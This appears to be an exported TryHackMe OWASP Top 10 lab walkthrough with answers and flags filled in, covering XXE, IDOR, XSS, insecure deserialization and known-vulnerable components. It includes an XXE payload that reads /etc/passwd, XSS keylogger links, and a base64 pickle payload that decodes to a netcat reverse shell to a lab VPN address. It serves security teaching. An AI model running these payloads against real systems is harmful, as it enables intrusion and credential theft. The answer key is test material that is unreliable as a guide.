<p>Now we'll see some XXE payload and see how they are working.<br /><br />1) The first payload we'll see is very simple. If you've read the previous task properly then you'll understand this payload very easily.<br /><br /><code style="font-size:14px">&lt;!DOCTYPE replace [&lt;!ENTITY name "feast"&gt; ]&gt;<br /> &lt;userInfo&gt;<br />  &lt;firstName&gt;falcon&lt;/firstName&gt;<br />  &lt;lastName&gt;&amp;name;&lt;/lastName&gt;<br /> &lt;/userInfo&gt;<br /></code><br /></p><p><br />As we can see we are defining a <code style="font-size:14px">ENTITY</code> called <code style="font-size:14px">name</code> and assigning it a value <code style="font-size:14px">feast</code>. Later we are using that ENTITY in our code.<br /></p><p>2) We can also use XXE to read some file from the system by defining an ENTITY and having it use the SYSTEM keyword<br /><br /><code style="font-size:14px">&lt;?xml version="1.0"?&gt;<br />&lt;!DOCTYPE root [&lt;!ENTITY read SYSTEM 'file:///etc/passwd'&gt;]&gt;<br />&lt;root&gt;&amp;read;&lt;/root&gt;</code><br /><br />Here again, we are defining an ENTITY with the name <code style="font-size:14px">read</code> but the difference is that we are setting it value to `SYSTEM` and path of the file.<br /><br />If we use this payload then a website vulnerable to XXE(normally) would display the content of the file <code style="font-size:14px">/etc/passwd</code>.</p><p>In a similar manner, we can use this kind of payload to read other files but a lot of times you can fail to read files in this manner or the reason for failure could be the file you are trying to read.</p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. Try the payload mentioned in description on the website.

```
OK
```

----------------------------------------

### TASK 16. [Severity 4] XML External Entity - Exploiting

<div>Now let us see some payloads in action. The payload that I'll be using is the one we saw in the previous task.</div><div><br /></div><div>1) Let's see how the website would look if we'll try to use the payload for displaying the name.</div><div><br /></div><div><img src="https://i.imgur.com/OHXXxi4.png" style="width:1046.67px" /><br /></div><div><br /></div><div>On the left side, we can see the burp request that was sent with the URL encoded payload and on the right side we can see that the payload was able to successfully display name <code style="font-size:14px">falcon feast</code></div><div><br /></div><div>2) Now let's try to read the <code style="font-size:14px">/etc/passwd</code></div><div><br /></div><div><img src="https://i.imgur.com/092GSLz.png" style="width:1046.67px" /></div>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. Try to display your own name using any payload.

```
OK
```

2. <p>See if you can read the /etc/passwd<br /></p>

```
OK
```

3. <p>What is the name of the user in /etc/passwd<br /></p>

```
falcon
```

4. <p>Where is falcon's SSH key located?<br /></p>

```
/home/falcon/.ssh/id_rsa
```

5. <p>What are the first 18 characters for falcon's private key<br /></p>

```
MIIEogIBAAKCAQEA7
```

----------------------------------------

### TASK 17. [Severity 5] Broken Access Control

<div style="text-align:center"><div><img src="https://i.imgur.com/fNlDFTR.png" style="width:256px;height:133.981px" /><br /><br /></div><div>Websites have pages that are protected from regular visitors, for example only the site's admin user should be able to access a page to manage other users. If a website visitor is able to access the protected page/pages that they are not authorised to view, the access controls are broken.</div><div style="text-align:left"><br /></div><div style="text-align:left">A regular visitor being able to access protected pages, can lead to the following:</div><ul><li style="text-align:left">Being able to view sensitive information</li><li style="text-align:left">Accessing unauthorized functionality</li></ul><div style="text-align:left"><span style="font-size:1rem">OWASP have a listed a few attack scenarios demonstrating access control weaknesses:</span><br /></div><div style="text-align:left"><span style="font-weight:bolder;font-size:1rem"><br /></span></div><div style="text-align:left"><span style="font-weight:bolder;font-size:1rem">Scenario #1:</span><span style="font-size:1rem"> The application uses unverified data in a SQL call that is accessing account information:</span></div><div style="text-align:left;margin-left:25px">pstmt.setString(1, request.getParameter("acct"));</div><div style="text-align:left;margin-left:25px">ResultSet results = pstmt.executeQuery( );</div><div style="text-align:left"><br /></div><div style="text-align:left">An attacker simply modifies the ‘acct’ parameter in the browser to send whatever account number they want. If not properly verified, the attacker can access any user’s account.</div><div style="text-align:left">http://example.com/app/accountInfo?acct=notmyacct</div><div style="text-align:left"><br /></div><div style="text-align:left"><span style="font-weight:bolder">Scenario #2:</span> An attacker simply force browses to target URLs. Admin rights are required for access to the admin page.</div><div style="text-align:left;margin-left:25px">http://example.com/app/getappInfo</div><div style="text-align:left;margin-left:25px">http://example.com/app/admin_getappInfo</div><div style="text-align:left"><br /></div><div style="text-align:left">If an unauthenticated user can access either page, it’s a flaw. If a non-admin can access the admin page, this is a flaw (<a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control" target="_blank">reference to scenarios</a>).</div><div style="text-align:left"><br /></div><div style="text-align:left">To put simply, broken access control allows attackers to bypass authorization which can allow them to view sensitive data or perform tasks as if they were a privileged user.</div></div>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. Read and understand how broken access control works.<br />

```
OK
```

----------------------------------------

### TASK 18. [Severity 5] Broken Access Control (IDOR Challenge)

<div style="text-align:center"><p style="color:"><img src="https://i.imgur.com/v7GuE3d.png" style="width:460.641px;height:275.094px" /><br /></p><p style="text-align:left;color:">IDOR, or Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled, to access resources you wouldn't ordinarily be able to access. IDOR is a type of access control vulnerability.</p><p style="text-align:left;color:">For example, let's say we're logging into our bank account, and after correctly authenticating ourselves, we get taken to a URL like this <a href="https://example.com/bank?account_number=1234">https://example.com/bank?account_number=1234</a>. On that page we can see all our important bank details, and a user would do whatever they needed to do and move along their way thinking nothing is wrong.</p><p style="margin-bottom:1rem;text-align:left;color:">There is however a potentially huge problem here, a hacker may be able to change the account_number parameter to something else like 1235, and if the site is incorrectly configured, then he would have access to someone else's bank information.</p></div>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. Read and understand how IDOR works.<br />

```
OK
```

2. <p>Deploy the machine and go to <a href="http://machine_ip/">http://MACHINE_IP</a><a href="http://machine_ip/" target="_blank"></a> - Login with the username being <span style="font-weight:bolder">noot</span> and the password <span style="font-weight:bolder">test1234</span>.<br /></p>

```
OK
```

3. <p>Look at other users notes. What is the flag?<br /></p>

```
flag{fivefourthree}
```

----------------------------------------

### TASK 19. [Severity 6] Security Misconfiguration

<h2>Security Misconfiguration</h2>
<p>Security Misconfigurations are distinct from the other Top 10 vulnerabilities, because they occur when security could have been configured properly but was not.<br /></p><p>Security misconfigurations include:</p>
<ul>
<li>Poorly configured permissions on cloud services, like S3 buckets</li>
<li>Having unnecessary features enabled, like services, pages, accounts or privileges</li>
<li>Default accounts with unchanged passwords</li>
<li>Error messages that are overly detailed and allow an attacker to find out more about the system</li>
<li>Not using <a href="https://owasp.org/www-project-secure-headers/">HTTP security headers</a>, or revealing too much detail in the Server: HTTP header</li>
</ul>
<p>This vulnerability can often lead to more vulnerabilities, such as default credentials giving you access to sensitive data, XXE or command injection on admin pages.</p>
<p>For more info, I recommend having a look at the <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration">OWASP top 10 entry for Security Misconfiguration</a></p>
<h2>Default Passwords</h2>
<p>Specifically, this VM focusses on default passwords. These are a specific example of a security misconfiguration. You could, and should, change any default passwords but people often don't.</p><p>It's particularly common in embedded and Internet of Things devices, and much of the time the owners don't change these passwords.</p><p>It's easy to imagine the risk of default credentials from an attacker's point of view. Being able to gain access to admin dashboards, services designed for system administrators or manufacturers, or even network infrastructure could be incredibly useful in attacking a business. From data exposure to easy RCE, the effects of default credentials can be severe.</p><p>In October 2016, Dyn (a DNS provider) was taken offline by one of the most memorable DDoS attacks of the past 10 years. The flood of traffic came mostly from Internet of Things and networking devices like routers and modems, infected by the Mirai malware.</p><p>How did the malware take over the systems? Default passwords. The malware had a list of 63 username/password pairs, and attempted to log in to exposed telnet services.</p>
<p>The DDoS attack was notable because it took many large websites and services offline. Amazon, Twitter, Netflix, GitHub, Xbox Live, PlayStation Network, and many more services went offline for several hours in 3 waves of DDoS attacks on Dyn.</p>
<h2>Practical example</h2>
<p>This VM showcases a <code style="font-size:14px">Security Misconfiguration</code>, as part of the OWASP Top 10 Vulnerabilities list.</p>
<p>Deploy the VM, and hack in by exploiting the Security Misconfiguration!</p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. Deploy the VM<br />

```
OK
```

2. <p>Hack into the webapp, and find the flag!<br /></p>

```
thm{4b9513968fd564a87b28aa1f9d672e17}
```

----------------------------------------

### TASK 20. [Severity 7] Cross-site Scripting

<div><h2><span style="font-weight:bolder">XSS Explained</span></h2></div><div>Cross-site scripting, also known as XSS is a security vulnerability typically found in web applications. It’s a type of injection which can allow an attacker to execute malicious scripts and have it execute on a victim’s machine.</div><div><br /></div><div>A web application is vulnerable to XSS if it uses unsanitized user input. XSS is possible in Javascript, VBScript, Flash and CSS. There are three main types of cross-site scripting:</div><ol><li><span style="font-weight:bolder">Stored XSS</span> - the most dangerous type of XSS. This is where a malicious string originates from the website’s database. This often happens when a website allows user input that is not sanitised (remove the "bad parts" of a users input) when inserted into the database.</li><li><span style="font-weight:bolder">Reflected XSS</span> - the malicious payload is part of the victims request to the website. The website includes this payload in response back to the user. To summarise, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.</li><li><span style="font-weight:bolder">DOM-Based XSS</span> - DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document and this document can be either displayed in the browser window or as the HTML source.</li></ol><div>For more XSS explanations and exercises, check out the <a href="https://tryhackme.com/room/xss" target="_blank">XSS room</a>.</div><div><br /></div><div><h2><span style="font-weight:bolder">XSS Payloads</span></h2><p>Remember, cross-site scripting is a vulnerability that can be exploited to execute malicious Javascript on a victim’s machine. Check out some common payloads types used:</p><ul><li>Popup's (&lt;script&gt;alert(“Hello World”)&lt;/script&gt;) - Creates a Hello World message popup on a users browser.</li><li>Writing HTML (document.write) - Override the website's HTML to add your own (essentially defacing the entire page).</li><li>XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) - You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.</li><li>Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - A mini local port scanner (more information on this is covered in the TryHackMe XSS room).</li></ul><p>XSS-Payloads.com (http://www.xss-payloads.com/) is a website that has XSS related Payloads, Tools, Documentation and more. You can download XSS payloads that take snapshots from a webcam or even get a more capable port and network scanner.<br /><br /><span style="font-size:2rem;font-weight:bolder">XSS Challenge</span></p><p>The VM attached to this task showcases DOM-Based, Reflected and Stored XSS. Deploy the machine and exploit each type!</p></div>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. Deploy the VM<br />

```
OK
```

2. <p>Navigate to <a href="http://MACHINE_IP/" target="_blank">http://MACHINE_IP/</a> in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".<br /></p>

```
ThereIsMoreToXSSThanYouThink
```

3. <p>On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.<br /></p>

```
ReflectiveXss4TheWin
```

4. <p>Now navigate to <a href="http://machine_ip/" target="_blank">http://MACHINE_IP/</a> in your browser and <span style="font-size:1rem">click on the "Stored XSS" tab on the navbar;</span><span style="font-size:1rem"> </span><span style="font-size:1rem">make an account.</span></p><p><span style="font-size:1rem">Then add a comment and see if you can insert some of your own HTML.</span></p>

```
HTML_T4gs
```

5. <p>On the same page, c<span style="font-size:1rem">reate an alert popup box appear on the page with your document cookies.</span><br /></p>

```
W3LL_D0N3_LVL2
```

6. <p>Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.<br /></p>

```
websites_can_be_easily_defaced_with_xss
```

----------------------------------------

### TASK 21. [Severity 8] Insecure Deserialization

<p style="text-align:center"><span style="font-size:18px">.:. OWASP10 - A8: Insecure Deserialisation .:.</span></p><p style="text-align:center"><img src="https://i.imgur.com/ReL2rEe.png" style="width:523px" /></p><p style="text-align:center"><i>"Insecure Deserialization is a vulnerability which occurs when untrusted data is used to abuse the logic of an application" (Acunetix., 2017)<br /><br /></i></p><p>This definition is still quite broad to say the least. Simply, insecure deserialization is replacing data processed by an application with malicious code; allowing anything from DoS (Denial of Service) to RCE (Remote Code Execution) that the attacker can use to gain a foothold in a pentesting scenario.</p><p><span style="font-size:1rem">Specifically, this malicious code leverages the legitimate serialization and deserialization process used by web applications. We'll be explaining this process and why it is so commonplace in modern web applications.</span><br /></p><p><span style="font-size:1rem"><br /></span></p><p style="text-align:center"><span style="font-size:1rem"><i>OWASP rank this vulnerability as 8 out of 10 because of the following reasons</i>:</span></p><p style="text-align:center"><span style="font-size:1rem"><br /></span></p><p>- Low exploitability. This vulnerability is often a case-by-case basis - there is no reliable tool/framework for it. Because of its nature, attackers need to have a good understanding of the inner-workings of the ToE.</p><p>- The exploit is only as dangerous as the attacker's skill permits, more so, the value of the data that is exposed. For example, someone who can only cause a DoS will make the application unavailable. The business impact of this will vary on the infrastructure - some organisations will recover just fine, others, however, will not.</p><p style="text-align:center"><span style="font-size:18px"><b>What's Vulnerable?</b></span></p><p>At summary, ultimately, any application that stores or fetches data where there are no validations or integrity checks in place for the data queried or retained. A few examples of applications of this nature are:</p><p>- E-Commerce Sites<br /><span style="font-size:1rem">- Forums<br /></span><span style="font-size:1rem">- API's<br /></span><span style="font-size:1rem">- Application Runtimes (Tomcat, Jenkins, Jboss, etc)</span></p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. Who developed the Tomcat application?<br />

```
The Apache Software Foundation
```

2. <p>What type of attack that crashes services can be performed with insecure deserialization?<br /></p>

```
Denial of Service
```

----------------------------------------

### TASK 22. [Severity 8] Insecure Deserialization - Objects

<div style="text-align:center"><span style="font-size:18px">﻿</span><span style="font-size:18px"><b>Objects</b></span></div><div style="text-align:center"><br /></div><div>A prominent element of object-oriented programming (OOP), objects are made up of two things:</div><div>- State</div><div>- Behaviour</div><div><br /></div><div>Simply, objects allow you to create similar lines of code without having to do the leg-work of writing the same lines of code again.</div><div><br /></div><div>For example, a lamp would be a good object. Lamps can have different types of bulbs, this would be their state, as well as being either on/off - their behaviour!</div><div><br /></div><div>Rather than having to accommodate every type of bulb and whether or not that specific lamp is on or off, you can use methods to simply alter the state and behaviour of the lamp.</div>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. <p>Select the correct term of the following statement:<br /></p><p><br /><i>if a dog was sleeping, would this be:</i></p><p><span style="font-size:1rem">A) A State<br /></span><span style="font-size:1rem">B) A Behaviour </span></p>

```
A Behaviour
```

----------------------------------------

### TASK 23. [Severity 8] Insecure Deserialization - Deserialization

<div style="text-align:center"><span style="font-size:18px"><b>De(Serialization)</b></span></div><div style="text-align:center"><span style="font-size:18px"><br /></span></div><div style="text-align:center"><span style="font-size:18px"><div><span style="font-size:16px"><i>Learning is best done through analogies</i></span></div><div><br /></div><div style="text-align:left"><span style="font-size:16px">A Tourist approaches you in the street asking for directions. They're looking for a local landmark and got lost. Unfortunately, English isn't their strong point and nor do you speak their dialect either. What do you do? You draw a map of the route to the landmark because pictures cross language barriers, they were able to find the landmark. Nice! You've just serialised some information, where the tourist then deserialised it to find the landmark.</span></div><div style="text-align:left"><br /></div><div style="text-align:left"><span style="font-size:16px"><br /></span></div><div><b>Continued</b></div><div style="text-align:left"><br /></div><div style="text-align:left"><span style="font-size:16px">Serialisation is the process of converting objects used in programming into simpler, compatible formatting for transmitting between systems or networks for further processing or storage.</span></div><div style="text-align:left"><br /></div><div style="text-align:left"><span style="font-size:16px">Alternatively, deserialisation is the reverse of this; converting serialised information into their complex form - an object that the application will understand.</span></div><div style="text-align:left"><br /></div><div style="text-align:left"><br /></div><div><b>What does this mean?</b></div><div><br /></div><div style="text-align:left"><span style="font-size:16px">Say you have a password of "password123" from a program that needs to be stored in a database on another system. To travel across a network this string/output needs to be converted to binary. Of course, the password needs to be stored as "password123" and not its binary notation. Once this reaches the database, it is converted or deserialised back into "password123" so it can be stored.</span></div><div style="text-align:left"><span style="font-size:16px"><br /></span></div><div style="text-align:left"><span style="font-size:16px"><div style="text-align:center"><i>The process is best explained through diagrams:</i></div></span></div></span></div><div style="text-align:center"><img src="https://i.imgur.com/ZB76mLI.png" style="width:589px" /><span style="font-size:18px"><br /></span></div><div style="text-align:center"><span style="font-size:18px"><br /></span></div><div style="text-align:center"><span style="font-size:18px"><br /></span></div><div style="text-align:center"><span style="font-size:18px"><div><b>How can we leverage this?</b></div><div><br /></div><div style="text-align:left"><span style="font-size:16px">Simply, insecure deserialization occurs when data from an untrusted party (I.e. a hacker) gets executed because there is no filtering or input validation; the system assumes that the data is trustworthy and will execute it no holds barred.</span></div></span></div>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. What is the name of the base-2 formatting that data is sent across a network as? 

```
Binary
```

----------------------------------------

### TASK 24. [Severity 8] Insecure Deserialization - Cookies

<p style="text-align:center"><span style="font-size:18px"><b>Cookies 101</b></span></p><p style="text-align:center"><img src="https://i.imgur.com/q8lRYI7.png" style="width:86.0938px;height:86.0938px" /></p><p>Ah yes, the origin of many memes. Cookies are an essential tool for modern websites to function. Tiny pieces of data, these are created by a website and stored on the user's computer. </p><p style="text-align:center"><img src="https://i.imgur.com/phg51EI.png" style="width:368px" /></p><p>You'll see notifications like the above on most websites these days. Websites use these cookies to store user-specific behaviours like items in their shopping cart or session IDs.</p><p>In the web application, we're going to exploit, you'll notice cookies store login information like the below! Yikes!</p><p><br /></p><p style="text-align:center"><img src="https://i.imgur.com/QhR7aOX.png" style="width:794.688px;height:117px" /></p><p style="text-align:center"><br /></p><p>Whilst plaintext credentials is a vulnerability in itself, it is not insecure deserialization as we have not sent any serialized data to be executed!</p><p>Cookies are not permanent storage solutions like databases. Some cookies such as session ID's will clear when the browser is closed, others, however, last considerably longer. This is determined by the "Expiry" timer that is set when the cookie is created.</p><p><br /></p><p style="text-align:center"><i>Some cookies have additional attributes, a small list of these are below:</i></p><table class="table table-bordered" style="width:1046px"><tbody><tr><td>Attribute</td><td>Description</td><td>Required?</td></tr><tr><td>Cookie Name</td><td>The Name of the Cookie to be set</td><td>Yes</td></tr><tr><td>Cookie Value</td><td>Value, this can be anything plaintext or encoded </td><td>Yes</td></tr><tr><td>Secure Only</td><td>If set, this cookie will only be set over HTTPS connections</td><td>No<br /></td></tr><tr><td>Expiry</td><td>Set a timestamp where the cookie will be removed from the browser</td><td>No<br /></td></tr><tr><td>Path</td><td>The cookie will only be sent if the specified URL is within the request</td><td>No</td></tr></tbody></table><p><i><br /></i></p><p style="text-align:center"><span style="font-size:18px">﻿<b>Creating Cookies</b></span></p><p style="text-align:center"><img src="https://i.imgur.com/eCNHZmA.png" style="width:72.5px;height:72.5px" /><span style="font-size:18px"><br /></span></p><p>Cookies can be set in various website programming languages. For example, Javascript, PHP or Python to name a few. The following web application is developed using Python's Flask, so it is fitting to use it as an example.</p><p style="text-align:center"><i>Take the snippet below:</i></p><p style="text-align:center"><img src="https://i.imgur.com/9WOYwbF.png" style="width:610.5px;height:290.005px" /><br /></p><p>Setting cookies in Flask is rather trivial. Simply, this snippet gets the current date and time, stores it within the variable "timestamp" and then stores the date and time in a cookie named "registrationTimestamp". This is what it will look like in the browser.</p><p style="text-align:center"><img src="https://i.imgur.com/I4oUGsn.png" style="width:676px" /><br /></p><p style="text-align:center"><i>It's as simple as that.</i></p><p style="text-align:center">.:. </p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. If a cookie had the path of <i>webapp.com/login </i>, what would the URL that the user has to visit be?

```
webapp.com/login
```

2. <p>What is the acronym for the web technology that <i>Secure</i> cookies work over?<br /></p>

```
HTTPS
```

----------------------------------------

### TASK 25. [Severity 8] Insecure Deserialization - Cookies Practical

<div style="text-align:center"><span style="font-size:18px"><b>Accessing your Instance</b></span></div><div style="text-align:center"><span style="font-size:18px"><br /></span></div><div>﻿In the browser of the device that you are connected to the VPN with, navigate to http://<span style="font-weight:bolder">MACHINE_IP.</span> I will be detailing the steps for Firefox - you may have to research how to inspect cookies in the browser of your choice. You will be greeted with the home page:</div><div><br /></div><div style="text-align:center"><img src="https://i.imgur.com/K7fIW9d.png" style="width:695.5px;height:477.065px" /><br /></div><div style="text-align:center"><br /></div><div><br /></div><div style="text-align:center"><i>Let's create an account. No need to enter your TryHackMe details, you can enter what you like.</i></div><div style="text-align:center"><i><br /></i></div><div style="text-align:center"><img src="https://i.imgur.com/P8o62li.png" style="width:713.5px;height:391.367px" /><i><br /></i></div><div style="text-align:center"><i><br /></i></div><div style="text-align:center"><i>Where you will be directed to your profile page. Notice on the right, you have your details.</i></div><div style="text-align:center"><i><br /></i></div><div style="text-align:center"><img src="https://i.imgur.com/6fYd0td.png" style="width:713.5px;height:288.559px" /><i><br /></i></div><div style="text-align:center"><br /></div><div style="text-align:center">Right-Click the Page and press "Inspect Element". Navigate to the "Storage" tab.</div><div style="text-align:center"><br /></div><div style="text-align:center"><img src="https://i.imgur.com/1LMFfV0.png" style="width:790.5px;height:149.488px" /><br /></div><div style="text-align:center"><br /></div><div style="text-align:center"><b>Inspecting Encoded Data</b></div><div>You will see here that there are cookies are both plaintext encoded and base64 encoded. The first flag will be found in one of these cookies.</div><div><br /></div><div><b>Modifying Cookie Values</b></div><div>Notice here that you have a cookie named "userType". You are currently a user, as confirmed by your information on the "myprofile" page.</div><div><br /></div><div>This application determines what you can and cannot see by your userType. What if you wanted to be come an admin?</div><div><br /></div><div>Double left-click the "Value" column of "userType" to modify the contents. Let's change our userType to "admin" and navigate to http://<span style="font-weight:bolder">MACHINE_IP/admin</span> to answer the second flag.</div>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. 1st flag (cookie value)

```
THM{good_old_base64_huh}
```

2. <p>2nd flag (admin dashboard)<br /></p>

```
THM{heres_the_admin_flag}
```

----------------------------------------

### TASK 26. [Severity 8] Insecure Deserialization - Code Execution

<p style="text-align:center"><i>A much more nefarious attack then simply decoding cookies, we get into the nitty-gritty.</i></p><p style="text-align:center"><span style="font-size:18px"><b>Setup</b></span></p><p>1. First, change the value of the userType cookie from "admin" to "user" and return to <a href="http://machine_ip/myprofile" target="_blank">http://MACHINE_IP/myprofile</a><span style="font-weight:bolder"><a href="http://machine_ip/myprofile."></a> </span></p><p>2. Then, left-click on the URL in "Exhange your vim" found in the screenshot below.</p><p style="text-align:center"><img src="https://i.imgur.com/tdGrvcI.png" style="width:953px;height:327.722px" /></p><p>3. Once you have done this, left-click on the URL in "Provide your feedback!" where you will be direct to page like so:</p><p><br /></p><p style="text-align:center"><img src="https://i.imgur.com/FwG0TBs.png" style="width:601px" /></p><p style="text-align:center"><span style="font-size:18px">.<b>What makes this form vulnerable?</b></span></p><p style="text-align:center"><span style="font-size:1rem;text-align:left">If a user was to enter their feedback, the data will get encoded and sent to the Flask application (presumably for storage within a database for example). However, the application assumes that any data encoded is trustworthy. But we're hackers. You can only trust us as far as you can fling us (and that's nigh-on impossible online)</span><br /></p><p style="text-align:center"><i>Although explaining programming is a bit out of scope for this room, it's important to understand what's going on in the snippet below:</i></p><p style="text-align:center"><img src="https://i.imgur.com/lgomAL9.png" style="width:688.329px;height:389.375px" /><br /></p><p><br /></p><p>When you visit the "Exchange your vim" URL, A cookie is encoded and stored within your browser - perfect for us to modify! Once you visit the feedback form, the value of this cookie is decoded and then deserialised. Uh oh. In the snippet below, we can see how the cookie is retrieved and then deserialized via <code style="font-size:14px">pickle.loads</code></p><p style="text-align:center"><img src="https://i.imgur.com/8id81K3.png" style="width:705.417px;height:270px" /></p><p style="text-align:center"><span style="text-align:left;font-size:1rem">This vulnerability exploits Python Pickle, which I have attached as reading material at the end of the room. We essentially have free reign to execute whatever we like such as a reverse shell.<br /><br /></span></p><p style="text-align:center"><span style="font-size:18px"><b>The Exploit</b></span></p><p>Now I'm not going to leave you hanging dry here. First, we need to set up a netcat listener on our Kali. If you are a subscriber, you can control your own <a href="https://tryhackme.com/my-machine" target="_blank">in-browser TryHackMe Kali Machine</a>.</p><p style="text-align:center"><img src="https://i.imgur.com/Ftsfnq0.png" style="width:247px" /></p><p style="text-align:center"><span style="font-size:1rem;text-align:left">Because the code being deserialized is from a base64 format, we cannot just simply spawn a reverse shell. We must encode our own commands in base64 so that the malicious code will be executed. I will be detailing the steps below with provided material to do so.</span><br /></p><p>Once this is complete, <a href="https://gist.github.com/CMNatic/af5c19a8d77b4f5d8171340b9c560fc3" target="_blank">copy-and-paste the source code from this Github page</a> to your kali and modify the source code to replace your "YOUR_TRYHACKME_VPN_IP" with your TryHackMe VPN IP. <a href="https://tryhackme.com/access" target="_blank">This can be obtained via the Access page</a>.</p><p style="text-align:center"><br /></p><p style="text-align:center">1. Create a python file to paste into, I have used "rce.py" for these examples:</p><p style="text-align:center"><img src="https://i.imgur.com/k93pazM.png" style="width:487px" /></p><p style="text-align:center"><br /></p><p style="text-align:center">2. Paste the code from the GitHub site, replacing YOUR_TRYHACKME_VPN_IP with your TryHackMe VPN IP from the access page</p><p style="text-align:center"><img src="https://i.imgur.com/gfR2lcf.png" style="width:934px" /></p><p style="text-align:center">3. Execute "rce.py" via <code style="font-size:14px">python3 rce.py</code></p><p style="text-align:center">4. Note the output of the command, it will look something similar to this:</p><p style="text-align:center"><img src="https://i.imgur.com/67OUbwN.png" style="width:1046px" /><br /></p><p style="text-align:center"><br /></p><p style="text-align:center">5. Copy and paste everything <span style="font-weight:bolder">in-between the two speech marks</span> ('DATA'). In my case, I will copy and paste:</p><p style="text-align:center"><code style="font-size:14px">gASVcgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFdybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCBuZXRjYXQgMTAuMTEuMy4yIDQ0NDQgPiAvdG1wL2aUhZRSlC4=</code>    Yours may look slightly different, just ensure that you copy everything in-between the two speech marks <code style="font-size:14px">''</code></p><p style="text-align:center"><br /></p><p style="text-align:center">6. Paste this into the "encodedPayload" cookie in your browser:</p><p style="text-align:center"><img src="https://i.imgur.com/fZDayjD.png" style="width:1046px" /><br /></p><p style="text-align:center"><br /></p><p style="text-align:center">7. Ensure our netcat listener is still running:</p><p style="text-align:center"><img src="https://i.imgur.com/Ftsfnq0.png" style="width:247px" /></p><p style="text-align:center">8. Refresh the page. It will hang, refer back to your netcat listener:</p><p style="text-align:center"><img src="https://i.imgur.com/WESTagT.png" style="width:491px" /><br /></p><p style="text-align:center">If you have performed the steps correctly, you will now have a remote shell to your instance. No privilege escalation involved, look for the flag.txt flag!</p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. flag.txt

```
4a69a7ff9fd68
```

----------------------------------------

### TASK 27. [Severity 9] Components With Known Vulnerabilities - Intro

<p>Occasionally, you may find that the company/entity that you're pen-testing is using a program that already has a well documented vulnerability.</p><p>For example, let's say that a company hasn't updated their version of WordPress for a few years, and using a tool such as wpscan, you find that it's version 4.6. Some quick research will reveal that WordPress 4.6 is vulnerable to an unauthenticated remote code execution(RCE) exploit, and even better you can find an exploit already made on <a href="https://www.exploit-db.com/exploits/41962" target="_blank">exploit-db</a>.</p><p>As you can see this would be quite devastating, because it requires very little work on the part of the attacker as often times since the vulnerability is already well known, someone else has made an exploit for the vulnerability. The situation becomes even worse when you realize, that it's really quite easy for this to happen, if a company misses a single update for a program they use, they could be vulnerable to any number of attacks.</p><p>Hence, why OWASP has rated this a 3(meaning high) on the prevalence scale, it is incredibly easy for a company to miss an update for an application.</p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. Read above.

```
OK
```

----------------------------------------

### TASK 28. [Severity 9] Components With Known Vulnerabilities - Exploit

<p>Recall that since this is about known vulnerabilities, most of the work has already been done for us. Our main job is to find out the information of the software, and research it until we can find an exploit. Let's go through that with an example web application.</p><p><br /></p><p align="center"><img src="https://imgur.com/bSuhuhp.png" style="width:476px" /></p><p align="center"><i>Nostromo 1.9.6</i><br /></p><p>What do you know, this server is using the default page for the nostromo web server. Now that we have a version number and a software name, we can use <a href="https://www.exploit-db.com/" target="_blank">exploit-db</a> to try and find an exploit for this particular version.</p><p>(Note: exploit-db is incredibly useful, and for all you beginners you're gonna be using this <span style="font-weight:bolder">a lot </span>so it's best to get comfortable with it)</p><p align="center"><img src="https://imgur.com/9Wd2E4g.png" style="width:644px" /></p><p>Lucky us, the top result happens to be an exploit script. Let's download it and try and to get code execution. Running this script on it's own actually teaches us a very important lesson.</p><p align="center"><img src="https://i.imgur.com/RqYyHBl.png" style="width:335px" /><br /></p><p>It may not work the first time. It helps to have an understanding of the programming language that the script is in, so that if needed you can fix any bugs or make any modifications, as quite a few scripts on exploit-db expect you to make modifications.</p><p align="center"><img src="https://i.imgur.com/Ht7uc6G.png" style="width:721px" /><br /></p><p>Fortunately for us, the error was caused by an line that should have been commented, so it's an easy fix.</p><p align="center"><img src="https://imgur.com/x1lHJod.png" style="width:319px" /></p><p><br /></p><p>Fixing that, let's try and run the program again.<br /></p><p><span style="font-size:1rem">Boom! We have RCE. Now it's important to note here that most scripts will just tell you what arguments you need to provide, exploit developers will rarely make you read potentially hundreds of lines of codes just to figure out how to use the script.</span><br /></p><p>It is also worth noting that it may not always be this easy, sometimes you will just be given a version number like in this case, but other times you may need to dig through the HTML source, or even take a lucky guess on an exploit script, but realistically if it is a known vulnerability, there's probably a way to discover what version the application is running.<br /></p><p>That's really it, the great thing about this piece of the OWASP 10, is that the work is pretty much already done for us, we just need to do some basic research, and as a penetration tester, you're already doing that quite a bit :).</p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. Read the above!

```
OK
```

----------------------------------------

### TASK 29. [Severity 9] Components With Known Vulnerabilities - Lab

<p>The following is a vulnerable application, all information you need to exploit it can be found online. <br /></p><p><span style="font-size:1rem">Note: When you find the exploit script, put all of your input in quotes, for example "id"</span><br /></p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)

```
1611
```

----------------------------------------

